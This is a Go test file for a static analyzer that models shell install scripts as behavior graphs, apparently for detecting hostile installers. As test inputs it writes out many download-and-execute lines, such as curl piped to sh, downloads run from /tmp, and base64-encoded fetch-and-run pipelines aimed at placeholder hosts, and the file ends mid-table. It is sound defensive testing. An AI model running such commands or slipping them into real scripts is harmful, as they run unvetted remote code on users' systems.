func TestAnalyzeShellLineRejectsMalformedSubstitutionBeforePipelineModeling(t *testing.T) {
	for _, line := range []string{
		`curl https://false.example/p $(printf x | sh`,
		"curl https://false.example/p `printf x | sh",
		`curl https://false.example/p <(printf x | sh`,
		`curl https://false.example/p ) | sh`,
	} {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
		if len(graph.Operations) != 0 || len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
			t.Fatalf("malformed substitution %q produced modeled behavior: %#v", line, graph)
		}
		if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
			t.Fatalf("malformed substitution %q lacks explicit partial coverage: %#v", line, graph.Coverage)
		}
	}
}

func TestAnalyzeShellLineDoesNotExecuteBracedParameterExpansionContents(t *testing.T) {
	for _, line := range []string{
		`echo ${X:-safe; curl https://parameter-decoy.example/p | sh; }`,
		`echo "${X:-${Y:-safe; curl https://nested-parameter-decoy.example/p | sh; }}"`,
		`curl "${URL:-https://runtime.example/p}" | sh`,
		`echo ${UNCLOSED:-curl https://unclosed-parameter.example/p | sh`,
	} {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
		if len(graph.Operations) != 0 || len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
			t.Fatalf("braced parameter expansion %q produced modeled execution: %#v", line, graph)
		}
		if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
			t.Fatalf("braced parameter expansion %q lacks partial coverage: %#v", line, graph.Coverage)
		}
	}
}

func TestAnalyzeShellLineTreatsSingleQuotedParameterExpansionAsLiteral(t *testing.T) {
	var graph behavior.Graph
	AnalyzeShellLine(
		&graph,
		artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"},
		`printf '%s' '${X:-curl https://literal.example/p | sh; }'`,
		1,
		testConnectedExecution("root-0001"),
		"ev-0001",
	)
	if hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("single-quoted parameter text was treated as expansion: %#v", graph.Coverage)
	}
	if len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("single-quoted parameter text produced behavior: %#v", graph)
	}
}

func TestAnalyzeShellLineRejectsMissingPipelineAndConditionalOperands(t *testing.T) {
	for _, line := range []string{
		`| curl https://leading-pipe.example/p | sh`,
		`curl https://trailing-pipe.example/p | sh |`,
		`curl https://double-pipe.example/p | | sh`,
		`curl https://leading-or.example/p | sh; || true`,
		`curl https://trailing-or.example/p | sh ||`,
		`curl https://trailing-and.example/p | sh &&`,
	} {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
		if len(graph.Operations) != 0 || len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
			t.Fatalf("malformed operator expression %q produced modeled behavior: %#v", line, graph)
		}
		if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
			t.Fatalf("malformed operator expression %q lacks partial coverage: %#v", line, graph.Coverage)
		}
	}
}

func TestAnalyzeShellLineReportsCombinedStdoutStderrPipeline(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `curl https://pipe-both.example/p |& sh`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Operations) != 0 || len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("unsupported |& pipeline produced modeled behavior: %#v", graph)
	}
	if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("unsupported |& pipeline lacks partial coverage: %#v", graph.Coverage)
	}
}

func TestAnalyzeShellLineReportsUnsupportedBackgroundAndBraceGroups(t *testing.T) {
	for _, line := range []string{
		`curl https://background-next.example/p | sh & echo done`,
		`{ curl https://brace-group.example/p | sh; }`,
	} {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
		if len(graph.Operations) != 0 || len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
			t.Fatalf("unsupported shell control form %q produced behavior: %#v", line, graph)
		}
		if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
			t.Fatalf("unsupported shell control form %q lacks partial coverage: %#v", line, graph.Coverage)
		}
	}
}

func TestAnalyzeShellLineKeepsTerminalBackgroundPipelineWithPartialScheduling(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `curl https://background.example/p | sh &`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 || len(graph.Network) != 1 {
		t.Fatalf("terminal background operator hid the preceding pipeline relation: %#v", graph)
	}
	if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("terminal background scheduling lacks partial coverage: %#v", graph.Coverage)
	}
}

func TestAnalyzeShellLineDoesNotConfuseRedirectionOrBraceExpansionWithControlForms(t *testing.T) {
	for _, line := range []string{
		`curl https://stderr-redirect.example/p 2>&1 | sh`,
		`echo {one,two}; curl https://brace-expansion.example/p | sh`,
	} {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
		if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 {
			t.Fatalf("ordinary redirection/brace expansion %q lost pipe relation: %#v", line, graph)
		}
	}
}

func TestAnalyzeShellLineFindsDownloaderInLaterPipelineSegment(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `true | curl https://middle.example/p | sh`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 || !hasRelationKind(graph.Relations, behavior.RelationPipesTo) {
		t.Fatalf("later adjacent downloader/interpreter pair was missed: %#v", graph.Relations)
	}
	if len(graph.Network) != 1 || !hasNetworkOperationDestination(graph, "https://middle.example/p") {
		t.Fatalf("later pipeline downloader network detail = %#v", graph.Network)
	}
}

func TestAnalyzeShellLineUsesInterpreterSpecificStaticScriptInput(t *testing.T) {
	tests := []struct {
		name        string
		line        string
		wantInput   string
		wantFlow    bool
		wantPartial bool
	}{
		{
			name:      "deno run operand",
			line:      `curl -o /tmp/payload.ts https://deno.example/payload; deno run /tmp/payload.ts`,
			wantInput: "/tmp/payload.ts",
			wantFlow:  true,
		},
		{
			name:      "deno subcommand is not a file",
			line:      `curl -o run https://deno-decoy.example/payload; deno run unrelated.ts`,
			wantInput: "unrelated.ts",
			wantFlow:  false,
		},
		{
			name:        "dynamic Python operand",
			line:        `curl -o "$OUT" https://dynamic-input.example/payload; python "$OUT"`,
			wantInput:   "",
			wantFlow:    false,
			wantPartial: true,
		},
		{
			name:        "multiple Node targets are ambiguous",
			line:        `node --require ./preload.js app.js`,
			wantInput:   "",
			wantFlow:    false,
			wantPartial: true,
		},
		{
			name:        "Deno network module is not a file",
			line:        `deno run https://modules.example/main.ts`,
			wantInput:   "",
			wantFlow:    false,
			wantPartial: true,
		},
		{
			name:        "unknown Python option shape is not guessed",
			line:        `python --future-option /tmp/payload.py`,
			wantInput:   "",
			wantFlow:    false,
			wantPartial: true,
		},
		{
			name:        "unknown Node option shape is not guessed",
			line:        `node --future-option /tmp/payload.js`,
			wantInput:   "",
			wantFlow:    false,
			wantPartial: true,
		},
		{
			name:        "missing Node preload value is malformed",
			line:        `node --require`,
			wantInput:   "",
			wantFlow:    false,
			wantPartial: true,
		},
		{
			name:      "Python simple runtime option",
			line:      `python -u /tmp/payload.py`,
			wantInput: "/tmp/payload.py",
		},
		{
			name:      "shell simple runtime option",
			line:      `bash -x /tmp/install.sh`,
			wantInput: "/tmp/install.sh",
		},
		{
			name:      "shell noexec does not consume downloaded file",
			line:      `curl -o /tmp/install.sh https://validation.example/install; bash -n /tmp/install.sh`,
			wantFlow:  false,
			wantInput: "",
		},
		{
			name:      "shell pretty print does not consume downloaded file",
			line:      `curl -o /tmp/install.sh https://pretty.example/install; bash --pretty-print /tmp/install.sh`,
			wantFlow:  false,
			wantInput: "",
		},
		{
			name:      "Node simple runtime option",
			line:      `node --no-warnings /tmp/app.js`,
			wantInput: "/tmp/app.js",
		},
		{
			name:      "Node syntax check does not consume downloaded file",
			line:      `curl -o /tmp/app.js https://validation.example/app; node --check /tmp/app.js`,
			wantFlow:  false,
			wantInput: "",
		},
		{
			name:      "Node syntax check still executes an exact preload",
			line:      `curl -o /tmp/preload.js https://validation.example/preload; node --require /tmp/preload.js --check /tmp/app.js`,
			wantFlow:  true,
			wantInput: "/tmp/preload.js",
		},
		{
			name:      "Deno permission option",
			line:      `deno run --allow-net /tmp/main.ts`,
			wantInput: "/tmp/main.ts",
		},
		{
			name:      "Deno direct script",
			line:      `deno /tmp/direct.ts`,
			wantInput: "/tmp/direct.ts",
		},
		{
			name:      "Deno bare optional node modules flag",
			line:      `deno run --node-modules-dir /tmp/main.ts`,
			wantInput: "/tmp/main.ts",
		},
		{
			name:      "Deno bare optional V8 flags",
			line:      `deno run --v8-flags /tmp/main.ts`,
			wantInput: "/tmp/main.ts",
		},
		{
			name:      "Deno required minimum age",
			line:      `deno run --minimum-dependency-age 120 /tmp/main.ts`,
			wantInput: "/tmp/main.ts",
		},
		{
			name:        "Deno minimum age cannot consume the only operand as a program",
			line:        `curl -o /tmp/main.ts https://deno.example/main; deno run --minimum-dependency-age /tmp/main.ts`,
			wantFlow:    false,
			wantInput:   "",
			wantPartial: true,
		},
		{
			name:        "Deno boolean flag rejects an attached value",
			line:        `deno run --allow-all=garbage /tmp/main.ts`,
			wantInput:   "",
			wantPartial: true,
		},
		{
			name: "Python module mode has no local file",
			line: `python -m http.server`,
		},
		{
			name: "shell command mode has no local file",
			line: `bash -c 'echo ok'`,
		},
		{
			name: "Node eval mode has no local file",
			line: `node -e 'console.log(1)'`,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh", ScopeID: "scope-0001"}
			AnalyzeShellLine(&graph, content, tt.line, 1, testConnectedExecution("root-0001"), "ev-0001")
			LinkOperationRelations(&graph)

			var gotInput string
			foundInterpreter := false
			for _, operation := range graph.Operations {
				if operation.Kind != behavior.OperationInterpreterInvoke {
					continue
				}
				foundInterpreter = true
				if binding, ok := operation.FirstBinding(behavior.ResourceRoleLocalInput); ok {
					gotInput = binding.Resource.Value
				}
			}
			if !foundInterpreter {
				t.Fatalf("interpreter invocation was not retained: %#v", graph.Operations)
			}
			if gotInput != tt.wantInput {
				t.Fatalf("interpreter local_input = %q, want %q: %#v", gotInput, tt.wantInput, graph.Operations)
			}
			if got := hasOperationFlowRelation(graph.Relations); got != tt.wantFlow {
				t.Fatalf("operation flow = %v, want %v: %#v", got, tt.wantFlow, graph.Relations)
			}
			if got := hasPartialCoverageScope(graph.Coverage, "interpreter-input-analysis"); got != tt.wantPartial {
				t.Fatalf("interpreter input partial coverage = %v, want %v: %#v", got, tt.wantPartial, graph.Coverage)
			}
		})
	}
}

func TestShellAlternativeAndBackgroundOrderDoNotCreateFileFlow(t *testing.T) {
	tests := []struct {
		name string
		data string
	}{
		{
			name: "alternative list",
			data: `curl -o /tmp/payload https://example.invalid/payload || python /tmp/payload`,
		},
		{
			name: "terminal background then later line",
			data: "curl -o /tmp/payload https://example.invalid/payload &\npython /tmp/payload",
		},
		{
			name: "background command inside nested shell",
			data: `sh -c 'curl -o /tmp/payload https://example.invalid/payload &' ; python /tmp/payload`,
		},
		{
			name: "mutually exclusive branches",
			data: "if true; then\ncurl -o /tmp/payload https://example.invalid/payload\nelse\npython /tmp/payload\nfi",
		},
		{
			name: "negated conditional list",
			data: `! curl -o /tmp/payload https://example.invalid/payload && python /tmp/payload`,
		},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractText(&graph, artifact.Content{
				NodeID:                "node-script",
				ScopeID:               "scope-script",
				LogicalPath:           "install.sh",
				SemanticLanguage:      "shell",
				Data:                  []byte(test.data),
				ExecutionConnectivity: string(behavior.ConnectivityConnected),
				ExecutionRootIDs:      []string{"root-script"},
			})
			LinkOperationRelations(&graph)
			if hasOperationFlowRelation(graph.Relations) {
				t.Fatalf("unproved shell scheduling produced file flow: %#v", graph.Relations)
			}
			if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
				t.Fatalf("unmodeled shell scheduling lacks partial coverage: %#v", graph)
			}
		})
	}
}

func TestShellSequentialListsStillCreateFileFlow(t *testing.T) {
	for _, data := range []string{
		`curl -o /tmp/payload https://example.invalid/payload; python /tmp/payload`,
		`curl -o /tmp/payload https://example.invalid/payload && python /tmp/payload`,
	} {
		var graph behavior.Graph
		ExtractText(&graph, artifact.Content{
			NodeID:                "node-script",
			ScopeID:               "scope-script",
			LogicalPath:           "install.sh",
			SemanticLanguage:      "shell",
			Data:                  []byte(data),
			ExecutionConnectivity: string(behavior.ConnectivityConnected),
			ExecutionRootIDs:      []string{"root-script"},
		})
		LinkOperationRelations(&graph)
		if !hasOperationFlowRelation(graph.Relations) {
			t.Fatalf("proved sequential shell list lost file flow for %q: %#v", data, graph.Relations)
		}
	}
}

func TestShellSequentialMutationInvalidatesEarlierDownloadFlow(t *testing.T) {
	for _, data := range []string{
		`curl -o /tmp/payload https://example.invalid/payload; rm /tmp/payload; python /tmp/payload`,
		`curl -o /tmp/payload https://example.invalid/payload; cp /tmp/replacement /tmp/payload; python /tmp/payload`,
		`curl -o /tmp/payload https://example.invalid/payload; mv /tmp/payload /tmp/elsewhere; python /tmp/payload`,
	} {
		var graph behavior.Graph
		ExtractText(&graph, artifact.Content{
			NodeID:                "node-script",
			ScopeID:               "scope-script",
			LogicalPath:           "install.sh",
			SemanticLanguage:      "shell",
			Data:                  []byte(data),
			ExecutionConnectivity: string(behavior.ConnectivityConnected),
			ExecutionRootIDs:      []string{"root-script"},
		})
		LinkOperationRelations(&graph)
		if hasOperationFlowRelation(graph.Relations) {
			t.Fatalf("intervening exact file mutation left stale download flow for %q: %#v", data, graph.Relations)
		}
	}
}

func TestAnalyzeShellLineRetainsOperationsAcrossIntermediatePipelineCommand(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `curl https://intermediate.example/p | tee /tmp/payload | sh`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Network) != 1 || !hasNetworkOperationDestination(graph, "https://intermediate.example/p") {
		t.Fatalf("individual downloader operation was lost: %#v", graph.Network)
	}
	if hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("intermediate pipeline was overclaimed as a direct chain: %#v", graph.Relations)
	}
	if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("unmodeled intermediate pipeline relation lacks partial coverage: %#v", graph.Coverage)
	}
}

func TestAnalyzeShellLineReportsUnsupportedSubshellGrouping(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `(curl https://grouped.example/p | sh)`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("unsupported subshell grouping produced modeled pipeline behavior: %#v", graph)
	}
	if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("unsupported subshell grouping lacks explicit partial coverage: %#v", graph.Coverage)
	}
}

func TestAnalyzeShellLineDoesNotClaimDynamicExecutableResource(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `$PAYLOAD --run`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "process.execute" || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("dynamic executable should remain a generic operation without an invented file: %#v", graph.Operations)
	}
}

func TestAnalyzeShellLineSeparatesExecutableAndArguments(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `/tmp/payload --install "target value"`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Operations) != 1 {
		t.Fatalf("process operation count = %d, want one: %#v", len(graph.Operations), graph.Operations)
	}
	operation := graph.Operations[0]
	executable, executableOK := operation.FirstBinding(behavior.ResourceRoleExecutable)
	arguments, argumentsOK := operation.FirstBinding(behavior.ResourceRoleArguments)
	if operation.Kind != behavior.OperationProcessExecute || !executableOK || executable.Resource.Value != "/tmp/payload" || !argumentsOK || arguments.Resource.Kind != behavior.ResourceCommand || arguments.Resource.Value != "--install 'target value'" {
		t.Fatalf("process execution bindings = %#v", operation.ResourceBindings)
	}
}

func TestAnalyzeShellLineCommandLookupIsNotExecution(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `command -v curl https://not-command.example/p | sh`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "interpreter.invoke" || graph.Operations[0].RequiredResource().Value != "sh" {
		t.Fatalf("only the real shell invocation should be retained: %#v", graph.Operations)
	}
	if len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("command lookup should not become a download or pipeline relation: network=%#v relations=%#v", graph.Network, graph.Relations)
	}
	if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("unknown piped program lacks partial coverage: %#v", graph.Coverage)
	}
}

func TestAnalyzeShellLineNormalizesInstallerPackageOperation(t *testing.T) {
	tests := []struct {
		name      string
		line      string
		want      string
		execution behavior.ExecutionContext
	}{
		{
			name:      "sudo path-qualified installer",
			line:      `sudo /usr/sbin/installer -pkg "/Library/Application Support/Payload.pkg" -target /`,
			want:      "/Library/Application Support/Payload.pkg",
			execution: testConnectedExecution("root-0001"),
		},
		{
			name:      "unknown relative package",
			line:      `installer -pkg ./Payload.pkg -target CurrentUserHomeDirectory`,
			want:      "./Payload.pkg",
			execution: unknownExecutionContext(),
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{
				NodeID:                "node-0001",
				ScopeID:               "scope-0001",
				LogicalPath:           "postinstall",
				Architecture:          "arm64",
				SupportingEvidenceIDs: []string{"ev-parent"},
			}
			AnalyzeShellLine(&graph, content, tt.line, 27, tt.execution, "ev-command")

			if len(graph.Operations) != 1 {
				t.Fatalf("installer operations = %#v, want exactly one normalized operation", graph.Operations)
			}
			operation := graph.Operations[0]
			if operation.Kind != "package.install" || !testOperationHasResource(operation, "package", tt.want) {
				t.Fatalf("installer operation = %#v, want package.install for %q", operation, tt.want)
			}
			operationExecution, operationOK := executionContextKey(operation.Execution)
			wantExecution, wantOK := executionContextKey(tt.execution)
			if operation.Support != behavior.SupportCorroborated || !operationOK || !wantOK || operationExecution != wantExecution {
				t.Fatalf("installer operation provenance = %#v", operation)
			}
			if operation.SubjectNodeID != content.NodeID || operation.ScopeID != content.ScopeID || operation.Architecture != content.Architecture || operation.Line != 27 {
				t.Fatalf("installer operation source context = %#v", operation)
			}
			if len(operation.EvidenceIDs) != 2 || operation.EvidenceIDs[0] != "ev-command" || operation.EvidenceIDs[1] != "ev-parent" {
				t.Fatalf("installer operation evidence = %#v", operation.EvidenceIDs)
			}
		})
	}
}

func TestAnalyzeShellLineInstallerRejectsMalformedOrNonInvocationForms(t *testing.T) {
	lines := []string{
		`installer -target /`,
		`installer -pkg -target /`,
		`installer --pkg /tmp/not-explicit.pkg -target /`,
		`installer -pkg=/tmp/not-explicit.pkg -target /`,
		`installer -pkg /tmp/first.pkg -pkg /tmp/second.pkg -target /`,
		`echo installer -pkg /tmp/prose.pkg -target /`,
		`printf '%s\n' 'installer -pkg /tmp/prose.pkg -target /'`,
		`The installer -pkg /tmp/prose.pkg example is documentation`,
	}
	for _, line := range lines {
		t.Run(line, func(t *testing.T) {
			var graph behavior.Graph
			AnalyzeShellLine(&graph, artifact.Content{NodeID: "node-0001"}, line, 1, unknownExecutionContext(), "ev-0001")
			for _, operation := range graph.Operations {
				if operation.Kind == "package.install" {
					t.Fatalf("non-static or quoted prose %q produced package installation: %#v", line, graph.Operations)
				}
			}
		})
	}
}

func TestAnalyzeShellLineInstallerKeepsUnknownRuntimePackage(t *testing.T) {
	for _, line := range []string{
		`installer -pkg "$PKG" -target /`,
		`installer -pkg "$(build_pkg)" -target /`,
		`installer -pkg %@ -target /`,
	} {
		t.Run(line, func(t *testing.T) {
			var graph behavior.Graph
			AnalyzeShellLine(&graph, artifact.Content{NodeID: "node-0001"}, line, 1, testConnectedExecution("root-0001"), "ev-0001")
			if len(graph.Operations) != 1 {
				t.Fatalf("runtime package operation count = %d, want one: %#v", len(graph.Operations), graph.Operations)
			}
			operation := graph.Operations[0]
			if operation.Kind != "package.install" || !testOperationHasResource(operation, "package", "") || operation.Support != behavior.SupportCorroborated {
				t.Fatalf("runtime package should remain a typed unresolved resource: %#v", operation)
			}
		})
	}
}

func TestAnalyzeShellLineDoesNotTreatThirdPartyInstallerNameAsMacOSInstaller(t *testing.T) {
	for _, executable := range []string{"/tmp/installer", "./installer"} {
		t.Run(executable, func(t *testing.T) {
			var graph behavior.Graph
			AnalyzeShellLine(&graph, artifact.Content{NodeID: "node-0001"}, executable+` -pkg /tmp/Payload.pkg -target /`, 1, testConnectedExecution("root-0001"), "ev-0001")
			if len(graph.Operations) != 1 || graph.Operations[0].Kind != "process.execute" || graph.Operations[0].RequiredResource().Kind != "file" || graph.Operations[0].RequiredResource().Value != executable {
				t.Fatalf("third-party installer dispatch = %#v, want only generic file execution", graph.Operations)
			}
		})
	}
}

func TestAnalyzeShellLineMalformedPathQualifiedInstallerKeepsProcessFallback(t *testing.T) {
	var graph behavior.Graph
	AnalyzeShellLine(
		&graph,
		artifact.Content{NodeID: "node-0001"},
		`/usr/sbin/installer -pkg -target /`,
		1,
		unknownExecutionContext(),
		"ev-0001",
	)
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "process.execute" || graph.Operations[0].RequiredResource().Kind != "file" || graph.Operations[0].RequiredResource().Value != "/usr/sbin/installer" {
		t.Fatalf("malformed path-qualified installer fallback = %#v", graph.Operations)
	}
}

func TestAnalyzeShellLineInstallerInsideInterpreterPreservesInvocation(t *testing.T) {
	var graph behavior.Graph
	AnalyzeShellLine(
		&graph,
		artifact.Content{NodeID: "node-0001"},
		`sh -c 'installer -pkg /tmp/Payload.pkg -target /'`,
		1,
		testConnectedExecution("root-0001"),
		"ev-0001",
	)
	if len(graph.Operations) != 2 {
		t.Fatalf("interpreter-wrapped installer operations = %#v", graph.Operations)
	}
	interpreter := graph.Operations[0]
	executable, executableOK := testOperationBinding(interpreter, behavior.ResourceRoleExecutable)
	arguments, argumentsOK := testOperationBinding(interpreter, behavior.ResourceRoleArguments)
	if interpreter.Kind != behavior.OperationInterpreterInvoke || !executableOK || executable.Value != "sh" || !argumentsOK || arguments.Value != "-c 'installer -pkg /tmp/Payload.pkg -target /'" {
		t.Fatalf("interpreter invocation bindings = %#v", interpreter)
	}
	assertShellOperation(t, graph, "package.install", "package", "/tmp/Payload.pkg")
}

func TestAnalyzeShellLineDropsRuntimePlaceholderResource(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `chmod +x %@`, 1, unknownExecutionContext(), "ev-0001")

	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "file.make-executable" || graph.Operations[0].RequiredResource().Value != "" {
		t.Fatalf("runtime placeholder should not be reported as a concrete file target: %#v", graph.Operations)
	}
}

func TestAnalyzeShellLineDecodesLiteralBase64Pipeline(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `echo Y3VybCBodHRwczovL2RlY29kZWQuZXhhbXBsZS9wIC1vIC90bXAveDsgY2htb2QgK3ggL3RtcC94OyAvdG1wL3g= | base64 -D | sh`, 1, testConnectedExecution("root-0001"), "ev-0001")

	assertShellOperation(t, graph, "network.download", "file", "/tmp/x")
	assertShellOperation(t, graph, "file.make-executable", "file", "/tmp/x")
	assertShellOperation(t, graph, "process.execute", "file", "/tmp/x")
	if len(graph.Network) != 1 || !hasNetworkOperationDestination(graph, "https://decoded.example/p") {
		t.Fatalf("decoded network destination missing: %#v", graph.Network)
	}
	var decodedFeature bool
	for _, feature := range graph.Features {
		if feature.Key == "shell.base64_decoded_script" {
			decodedFeature = true
			break
		}
	}
	if !decodedFeature {
		t.Fatalf("decoded script feature missing: %#v", graph.Features)
	}
}

func TestAnalyzeShellLineDecodesLiteralBase64WithInterpreterLanguage(t *testing.T) {
	python := `import requests; requests.get("https://decoded-python.example/p")`
	encoded := base64.StdEncoding.EncodeToString([]byte(python))
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, "echo "+encoded+" | base64 -d | python3", 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Network) != 1 || !hasNetworkOperationDestination(graph, "https://decoded-python.example/p") {
		t.Fatalf("decoded Python was not analyzed with Python semantics: %#v", graph.Network)
	}
}

func TestAnalyzeShellLineFindsBase64WindowAndTrailingPipelineSegments(t *testing.T) {
	for _, line := range []string{
		`true | echo ZWNobyBvaw== | base64 -d | sh`,
		`echo ZWNobyBvaw== | base64 -d | sh | curl https://trailing.example/p`,
	} {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
		var decoded bool
		for _, feature := range graph.Features {
			decoded = decoded || feature.Key == "shell.base64_decoded_script"
		}
		if !decoded {
			t.Fatalf("base64 window was missed in %q: %#v", line, graph.Features)
		}
		if strings.Contains(line, "trailing.example") {
			if len(graph.Network) != 1 || !hasNetworkOperationDestination(graph, "https://trailing.example/p") {
				t.Fatalf("trailing pipeline operation was missed in %q: %#v", line, graph.Network)
			}
		}
	}
}

func TestAnalyzeShellLineBase64DecodeRequiresPipelineEndpoints(t *testing.T) {
	const encoded = `Y3VybCBodHRwczovL2Jhc2U2NC1kZWNveS5leGFtcGxlL3AgfCBzaA==`
	for _, line := range []string{
		`echo ` + encoded + ` > /tmp/encoded | base64 -d | sh`,
		`echo ` + encoded + ` | base64 -d < /tmp/safe | sh`,
		`echo ` + encoded + ` | base64 -d > /tmp/decoded | sh`,
		`echo ` + encoded + ` | base64 -D -i /tmp/safe | sh`,
		`echo ` + encoded + ` | base64 -D -o /tmp/decoded | sh`,
		`echo ` + encoded + ` | base64 -d /tmp/safe | sh`,
		`echo ` + encoded + ` | base64 -d - | sh`,
	} {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
		for _, feature := range graph.Features {
			if feature.Key == "shell.base64_decoded_script" {
				t.Fatalf("overridden base64 endpoint %q produced decoded feature: %#v", line, graph.Features)
			}
		}
		if len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
			t.Fatalf("overridden base64 endpoint %q produced decoded behavior: %#v", line, graph)
		}
		if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
			t.Fatalf("overridden base64 endpoint %q lacks partial coverage: %#v", line, graph.Coverage)
		}
	}
}

func TestAnalyzeShellLineBase64DecodeAcceptsExplicitPipelineEndpoints(t *testing.T) {
	const encoded = `ZWNobyBvaw==`
	for _, line := range []string{
		`echo ` + encoded + ` | base64 -D -i - -o - | sh`,
		`echo ` + encoded + ` 2>/dev/null | base64 -d 2>/dev/null | sh 2>/dev/null`,
	} {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
		var decoded bool
		for _, feature := range graph.Features {
			decoded = decoded || feature.Key == "shell.base64_decoded_script"
		}
		if !decoded {
			t.Fatalf("valid base64 endpoints were not decoded in %q: features=%#v coverage=%#v", line, graph.Features, graph.Coverage)
		}
	}
}

func TestDownloadPipeChainRequiresStdoutBodyAndStdinProgram(t *testing.T) {
	tests := []struct {
		line      string
		wantChain bool
	}{
		{line: `curl https://stdout.example/p | sh`, wantChain: true},
		{line: `curl -o /tmp/p https://file.example/p | sh`},
		{line: `wget https://file.example/p | sh`},
		{line: `wget -O - https://stdout.example/p | sh`, wantChain: true},
		{line: `curl https://command.example/p | sh -c 'echo safe'`},
		{line: `curl https://command.example/p | python -c pass`},
		{line: `curl https://command.example/p | node app.js`},
		{line: `curl https://redirect.example/p | sh < safe.sh`},
		{line: `curl -XHEAD https://head-attached.example/p | sh`},
